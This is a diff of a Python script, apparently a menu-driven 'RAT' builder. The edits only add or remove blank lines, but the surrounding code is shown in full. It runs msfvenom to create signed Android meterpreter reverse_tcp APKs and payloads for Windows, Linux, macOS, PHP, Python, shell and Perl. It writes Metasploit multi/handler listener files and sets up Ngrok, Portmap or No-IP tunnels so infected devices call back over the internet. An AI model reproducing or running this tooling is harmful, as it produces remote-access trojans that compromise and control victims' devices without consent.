@@ -27,6 +27,7 @@ formt = (('exe', 'elf', 'macho', 'raw'))
 #extensions
 ext = (('exe', 'elf', 'macho', 'php', 'py', 'sh', 'pl'))
 
+
 def network():
     print('''\n[ 1 ] Local Network
 [ 2 ] External Network''')
@@ -35,6 +36,7 @@ def tunnels():
     print('''\n[ 1 ] Ngrok
 [ 2 ] Portmap
 [ 3 ] No-IP''')
+
 
 def console_rc(name, content):
     file = open('{}-console.rc'.format(name), 'w')
@@ -74,24 +76,29 @@ def external(tunnel, payload, formt, ext):
         console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(payload, lhost, lport))
         print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))
 
+
 def main():
 
     system()
     sys = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32msystem\033[0m) > '))
 
     if sys == 1:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
+
         if net == 1:
             lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
             name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
             os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(ip, lport, name, name, name, name, name))
             console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(ip, lport))
+
         else:
             print('''\n[ 1 ] Ngrok
 [ 2 ] Portmap
 [ 3 ] No-IP''')
             tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
+
             if tunnel == 1:
                 name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                 lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
@@ -120,8 +127,10 @@ def main():
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
     elif sys == 2:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
+
         if net == 1:
             lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
             name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
@@ -133,6 +142,7 @@ def main():
 [ 2 ] Portmap
 [ 3 ] No-IP''')
             tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
+
             if tunnel == 1:
                 name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                 lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
@@ -164,6 +174,7 @@ def main():
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
     elif sys == 3:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -176,6 +187,7 @@ def main():
             external(tunnel, payload[1], formt[1], ext[1])
 
     elif sys == 4:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -188,6 +200,7 @@ def main():
             external(tunnel, payload[2], formt[2], ext[2])
 
     elif sys == 5:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -200,6 +213,7 @@ def main():
             external(tunnel, payload[3], formt[3], ext[3])
 
     elif sys == 6:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -212,6 +226,7 @@ def main():
             external(tunnel, payload[4], formt[3], ext[4])
 
     elif sys == 7:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -224,6 +239,7 @@ def main():
             external(tunnel, payload[5], formt[3], ext[5])
 
     elif sys == 8:
+
         network()
         net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
@@ -237,6 +253,5 @@ def main():
 
 if os.getuid() != 0:
     print('\n\033[33mPlease run it as root\033[0m\n')
-
 else:
     main()
